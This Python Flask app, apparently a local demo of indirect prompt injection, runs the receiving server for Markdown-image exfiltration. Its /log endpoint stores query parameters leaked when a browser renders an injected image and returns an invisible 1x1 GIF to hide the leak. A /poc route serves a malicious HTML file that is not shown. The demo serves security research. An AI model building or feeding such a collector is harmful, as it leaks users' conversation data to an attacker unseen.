import threading
import time

import requests as http_req
from bs4 import BeautifulSoup, Comment
from flask import Flask, Response, jsonify, render_template, request



_lock = threading.Lock()
_exfiltrated = []




app = Flask(__name__)



@app.route("/")
def index():
    return render_template("control_front.html")


@app.route("/log")
def log():
    """Endpoint che riceve le GET del browser che carica l'immagine Markdown.
    Scrive i parametri (dati esfiltrati) in memoria e restituisce un'immagine
    1×1 trasparente così l'utente non vede nessun broken-image icon."""
    params = {k: v for k, v in request.args.items()}
    if params:
        with _lock:
            _exfiltrated.append({
                "timestamp": time.strftime("%H:%M:%S"),
                "params":    params,
                "ip":        request.remote_addr,
            })

    # GIF 1×1 trasparente
    gif_bytes = (
        b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00"
        b"\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00"
        b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
    )
    return Response(gif_bytes, mimetype="image/gif")



@app.route("/received")
def received():
    """Usato dal frontend per polling: ritorna tutti i dati esfiltrati finora."""
    with _lock:
        return jsonify(list(_exfiltrated))


@app.route("/clear", methods=["POST"])
def clear():
    """Svuota il log (utile per resettare la demo prima di una nuova run)."""
    with _lock:
        _exfiltrated.clear()
    return jsonify({"ok": True})



@app.route("/poc")
def poc():
    return  render_template("malicious_file.html")



if __name__ == "__main__":
    print("=" * 58)
    print("  IPI Demo Flask App")
    print("  Apri: http://localhost:9000")
    print("=" * 58)
    app.run(debug=False, port=9000, threaded=True)